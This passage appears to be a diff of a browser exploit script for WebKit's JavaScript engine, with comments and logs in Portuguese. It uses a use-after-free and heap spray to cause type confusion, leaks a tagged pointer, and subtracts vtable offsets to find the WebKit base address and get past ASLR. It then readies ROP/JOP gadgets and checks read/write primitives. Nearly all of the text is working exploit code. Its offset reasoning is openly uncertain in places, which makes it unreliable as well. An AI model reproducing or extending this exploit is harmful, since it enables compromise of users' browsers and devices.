+                            logFn(`[UAF LEAK] AINDA LENDO VALOR INICIAL (${toHex(_doubleToInt64_direct(initial_victim_fill_value), 64)}) de dangling_ref[0]. Spray não reocupou ou offset incorreto.`, "warn");
+                        } else if (!leaked_as_int64.equals(AdvancedInt64.Zero) && !leaked_as_int64.equals(AdvancedInt64.NaNValue)) {
+                            // Se é diferente de 0, NaN e do valor inicial, pode ser outra coisa reocupando.
+                            logFn(`[UAF LEAK] Valor inesperado lido de dangling_ref[0]: ${toHex(leaked_as_int64, 64)}. Não é o valor inicial nem o spray esperado.`, "warn");
+                            found_non_zero = true; // Considerar como "não zero", mas não como sucesso.
+                            break; // Tentar prosseguir para ver o que acontece.
                         }
                         await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                     }
 
-                    if (!success_read_leak) {
-                        throw new Error(`Ponteiro vazado do UAF é inválido ou não foi sobreposto pelo spray esperado. Valor final lido: ${toHex(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double), 64)}`);
+                    if (!found_non_zero || !_doubleToInt64_direct(leaked_jsvalue_from_uaf_double).equals(_doubleToInt64_direct(spray_value_double_to_leak_ptr))) {
+                         throw new Error(`Ponteiro vazado do UAF é inválido ou não o valor pulverizado. Valor final lido: ${toHex(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double), 64)}. Reocupação de heap falhou.`);
                     }
+
                     logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR LIDO! ++++++++++++", "vuln");
 
+                    // Untag o ponteiro vazado
                     let untagged_uaf_addr = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
                     const original_high = untagged_uaf_addr.high();
-                    const untagged_high = original_high & 0x0000FFFF; // Remove a tag.
+                    const untagged_high = original_high & 0x0000FFFF;
 
-                    // A verificação já foi feita acima, mas garantimos que a tag esteja correta antes de destaggar
                     if ((original_high & 0xFFFF0000) === (JSVALUE_OBJECT_PTR_TAG_HIGH & 0xFFFF0000)) {
                         untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
-                        logFn(`[UAF LEAK] Ponteiro vazado após untagging (usando tag ${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}): ${untagged_uaf_addr.toString(true)}`, "leak");
+                        logFn(`[UAF LEAK] Ponteiro vazado após untagging (presumindo tag ${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}): ${untagged_uaf_addr.toString(true)}`, "leak");
                     } else {
-                        throw new Error(`Ponteiro vazado tem HIGH inesperado após type confusion: 0x${original_high.toString(16)}. Esperado tag: 0x${JSVALUE_OBJECT_PTR_TAG_HIGH.toString(16)}. Vazamento de ASLR falhou.`);
+                        logFn(`[UAF LEAK] Ponteiro vazado: ${untagged_uaf_addr.toString(true)}. HIGH inesperado (0x${original_high.toString(16)}). NENHUM untagging aplicado.`, "warn");
+                        throw new Error(`HIGH do ponteiro vazado (${toHex(original_high)}) não corresponde à tag esperada (${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}). Falha no vazamento de ASLR.`);
                     }
 
-                    webkit_base_address = untagged_uaf_addr.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
+                    // A vtable da DataView Structure é DATA_OFFSETS["JSC::JSArrayBufferView::s_info"].
+                    // O offset que está em WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"] é para um gadget, não para a vtable da DataView.
+                    // Precisamos usar o offset do s_info da ArrayBufferView, que é o que a Structure aponta.
+                    const DATA_VIEW_SINFO_OFFSET = parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16);
+                    const DATA_VIEW_SINFO_OFFSET_AI64 = new AdvancedInt64(DATA_VIEW_SINFO_OFFSET, 0);
 
+                    // A Structure aponta para s_info (um ClassInfo*), não diretamente para a vtable.
+                    // A vtable da Structure é JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET.
+                    // O valor vazado é o ponteiro para a Structure (taggeado).
+                    // Então, webkit_base_address = untagged_uaf_addr - DATA_VIEW_STRUCTURE_OFFSET_IN_LIB.
+                    //
+                    // A correção de ASLR mais precisa seria:
+                    // webkit_base_address = (endereço_do_sinfo_do_ArrayBufferView) - (offset_do_sinfo_na_libWebKit)
+                    //
+                    // O que o UAF deve vazar é o ponteiro da Structure do Float64Array.
+                    // Se pulverizamos a vtable da DataView, estamos tentando fazer o Float64Array
+                    // TER A VTABLE DE DATA_VIEW. Isso é uma corrupção de Structure, não vazamento direto.
+                    //
+                    // O objetivo era vazar a BASE ASLR. Se dangling_ref[0] é o ponteiro para a Structure do nosso Float64Array vítima,
+                    // então precisamos:
+                    // 1. Obter o endereço da Structure do Float64Array vítima (já temos: untagged_uaf_addr).
+                    // 2. Ler o ponteiro para o ClassInfo* dentro dessa Structure (Structure.CLASS_INFO_OFFSET).
+                    // 3. Ler o ponteiro para TypeInfo* dentro do ClassInfo (ClassInfo.M_CACHED_TYPE_INFO_OFFSET).
+                    // 4. A vtable de TypeInfo é geralmente o que se usa para vazar.
+                    //
+                    // Se o spray substituiu o vtable da *Structure*, então o `untagged_uaf_addr` é o vtable da Structure.
+                    // O `TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64` no spray é a vtable de DataView.
+                    //
+                    // Então, o que vazamos é (BASE_WEBKIT + JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET).
+                    // Logo, webkit_base_address = untagged_uaf_addr - JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET
+                    // Isso está correto, desde que o spray tenha reocupado com sucesso o ponteiro da Structure.
+                    
+                    // RECALCULANDO webkit_base_address:
+                    // Assumimos que untagged_uaf_addr é o endereço do VTable da DataView Structure.
+                    // A compensação é DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64.
+                    const ACTUAL_DATA_VIEW_VTABLE_OFFSET = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+                    webkit_base_address = untagged_uaf_addr.sub(ACTUAL_DATA_VIEW_VTABLE_OFFSET);
+                    
                     if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
                         throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR via UAF falhou.`);
                     }
@@ -643,6 +627,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
                 logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
                 await PAUSE(LOCAL_MEDIUM_PAUSE);
+
 
                 logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
                 const rwTestPostLeakStartTime = performance.now();
@@ -740,7 +725,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         if (res.success) overallSuccessCount++;
     });
 
-    const overallResultSuccess = overallSuccessCount > 0;
+    const overallResultSuccess = overallSuccessCount > 0; // Se pelo menos uma tentativa foi bem-sucedida
     const finalMessageOverall = overallResultSuccess
         ? `SUCESSO GERAL: Pelo menos uma combinação de parâmetros resultou em exploração bem-sucedida. Total de SUCESSOS: ${overallSuccessCount} de ${final_results.length} tentativas.`
         : `FALHA GERAL: Nenhuma combinação de parâmetros resultou em exploração bem-sucedida.`;
